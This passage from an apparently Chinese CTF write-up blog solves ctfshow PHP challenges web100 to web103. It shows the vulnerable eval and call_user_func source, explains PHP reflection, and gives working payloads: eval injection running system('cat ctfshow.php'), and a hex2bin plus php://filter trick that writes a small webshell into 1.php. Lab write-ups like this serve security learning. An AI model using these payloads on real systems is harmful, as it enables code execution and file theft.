class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span>('ctfshow')<span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>首先 $v0=is_numeric ($v1) and is_numeric ($v2) and is_numeric ($v3); 这里要让其值为 true，然后进入 if 语句</p>\n<p>判断三个数都为数字或者数字字符串才行，但是这里等号的运算优先级比 and 要高</p>\n<p>&amp;&amp; &gt; || &gt; = &gt; and &gt; or</p>\n<p>所以这里后面的 v2 和 v3 似乎没啥用，v2 不能有；v3 要有；，这里还要将中间的 ctfshow 干扰给过滤了，可以用多行注释，直接用？&gt; 结束也行</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>v1<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v2<span class=\"token operator\">=</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token comment\">/*&amp;v3=*/</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>v1<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v2<span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">27</span>cat<span class=\"token operator\">%</span><span class=\"token number\">20</span>ctfshow<span class=\"token operator\">.</span>php<span class=\"token operator\">%</span><span class=\"token number\">27</span><span class=\"token punctuation\">)</span><span class=\"token comment\">/*&amp;v3=*/</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">?</span>v1<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v2<span class=\"token operator\">=</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>v3<span class=\"token operator\">=</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"web101\"><a class=\"anchor\" href=\"#web101\">#</a> web101</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ctfshow.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//flag in class ctfshow;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$ctfshow</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$v1</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$v2</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$v3</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$v0</span><span class=\"token operator\">=</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\\"|\\'|\\,|\\.|\\;|\\?|[0-9]/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\\"|\\'|\\,|\\.|\\?|[0-9]/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span>('ctfshow')<span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>跟上一题相比较挺突然，突然过滤了好多东西，经观察，v3 还是可以有 &quot;;&quot;，这里要使用 php 反射，先浅浅的记录一下什么是 php 反射</p>\n<h3 id=\"php反射\"><a class=\"anchor\" href=\"#php反射\">#</a> php 反射</h3>\n<p>算的上是 php 中的一种非常普遍的高级操作，几乎在所有的 php 框架或是说工具中都能见到反射的身影，那么什么是反射？</p>\n<p>php 语言是一种简单的同时可以应用面向对象面向过程方式的变成语言，而在面向对象中对象被赋予了自省的能力，这种自省的过程就是反射，在 php 文档中是这样介绍的 “ <code>PHP 具有完整的反射 API，增加了内省类、接口、函数、方法和扩展的能力。 此外，反射 API 提供了方法来取出函数、类和方法中的文档注释。</code> ”，简单来说就是通过对象找到他所属的类，拥有哪些方法等等</p>\n<h3 id=\"demo\"><a class=\"anchor\" href=\"#demo\">#</a> demo</h3>\n<p>对于反射会接触到四个类</p>\n<pre><code>ReflectionClass\nReflectionFunction\nReflectionMethod\nReflectionParameter\n</code></pre>\n<p>接下来简单写一个 demo</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo1</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo2</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$test1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$test2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">test1</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'test1'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">test2</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'test2'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">functiontest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token comment\">//echo $this->test1;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">test2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">//$class=new ReflectionClass(demo2::class);</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ReflectionClass</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'demo2'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">//$funtion = new ReflectionMethod('demo2', '__construct');</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">//$Method = new ReflectionMethod('demo2', 'functiontest');</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">//$Parameter = new ReflectionParameter('demo2', 'functiontest');</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$class</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">//echo $funtion;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">//echo $Method;</span></span></pre></td></tr></table></figure><p>运行结果如下</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">Class</span> <span class=\"token punctuation\">[</span> <span class=\"token operator\">&lt;</span>user<span class=\"token operator\">></span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo2</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token operator\">-</span> Constants <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token operator\">-</span> <span class=\"token keyword\">Static</span> properties <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token operator\">-</span> <span class=\"token keyword\">Static</span> methods <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token operator\">-</span> Properties <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    Property <span class=\"token punctuation\">[</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">default</span><span class=\"token operator\">></span> <span class=\"token keyword\">public</span> <span class=\"token variable\">$test1</span> <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    Property <span class=\"token punctuation\">[</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">default</span><span class=\"token operator\">></span> <span class=\"token keyword\">private</span> <span class=\"token variable\">$test2</span> <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token operator\">-</span> Methods <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    Method <span class=\"token punctuation\">[</span> <span class=\"token operator\">&lt;</span>user<span class=\"token punctuation\">,</span> ctor<span class=\"token operator\">></span> <span class=\"token keyword\">public</span> method __construct <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      @@ <span class=\"token constant\">C</span><span class=\"token punctuation\">:</span>\\Users\\Clown\\Desktop\\exp<span class=\"token operator\">.</span>php <span class=\"token number\">7</span> <span class=\"token operator\">-</span> <span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    Method <span class=\"token punctuation\">[</span> <span class=\"token operator\">&lt;</span>user<span class=\"token operator\">></span> <span class=\"token keyword\">public</span> method functiontest <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      @@ <span class=\"token constant\">C</span><span class=\"token punctuation\">:</span>\\Users\\Clown\\Desktop\\exp<span class=\"token operator\">.</span>php <span class=\"token number\">12</span> <span class=\"token operator\">-</span> <span class=\"token number\">15</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">[</span>Done<span class=\"token punctuation\">]</span> exited with code<span class=\"token operator\">=</span><span class=\"token number\">0</span> in <span class=\"token number\">0.061</span> seconds</pre></td></tr></table></figure><p>可以看到将类中的信息打印出来，所有 payload</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">v1</span>=<span class=\"token value\">1</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">v2</span>=<span class=\"token value\">echo</span></span></span> new Reflectionclass&amp;v3=;</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">v1</span>=<span class=\"token value\">1</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">v2</span>=<span class=\"token value\">echo</span></span></span> new Reflectionclass<span class=\"token query\"><span class=\"token query-delimiter\">?</span></span>>&amp;v3=;</pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230102222148085.png\" alt=\"image-20230102222148085\" /></p>\n<h2 id=\"web102\"><a class=\"anchor\" href=\"#web102\">#</a> web102</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$v2</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$v3</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$v4</span> <span class=\"token operator\">=</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v3</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hacker'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>题目本意应该是 php5 下 is_numeric 可识别 16 进制，如 0x2e，然后调用 hex2bin 转成字符串写入木马，但题目环境没配好，是 php7, 所以要另换方法</p>\n<p>call_user_func () 这个函数是调用函数的一种方法</p>\n<p>因为写入要用伪协议写入，所以需要 base64 编码后转成 16 进制全是数字的字符串，payload：</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token path\">get</span>：<span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">v2</span>=<span class=\"token value\">115044383959474e6864434171594473</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">v3</span>=<span class=\"token value\">php://filter/write=convert.base64-decode/resource=1.php</span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token path\">post</span>：v1=hex2bin</pre></td></tr></table></figure><p>接下来解释一下</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'&lt;?=`cat *`;'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// PD89YGNhdCAqYDs=</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token function\">bin2hex</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'PD89YGNhdCAqYDs'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">//5044383959474e6864434171594473</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230102231612343.png\" alt=\"image-20230102231612343\" /></p>\n<h2 id=\"web103\"><a class=\"anchor\" href=\"#web103\">#</a> web103</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$v2</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$v3</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$v4</span> <span class=\"token operator\">=</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/.*p.*h.*p.*/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token 